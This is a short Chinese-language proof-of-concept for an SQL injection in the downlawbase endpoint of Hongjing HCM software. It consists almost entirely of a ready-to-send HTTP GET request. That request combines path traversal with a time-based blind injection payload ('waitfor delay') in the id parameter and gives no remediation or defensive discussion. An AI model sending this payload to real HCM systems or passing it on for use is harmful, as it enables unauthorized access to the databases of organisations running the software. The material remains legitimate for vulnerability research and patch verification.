## 宏景HCM-downlawbase接口存在SQL注入漏洞



## poc
```
GET /templates/attestation/../../selfservice/lawbase/downlawbase?id=11';waitfor+delay+'0:0:2'--+ HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0)
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
```
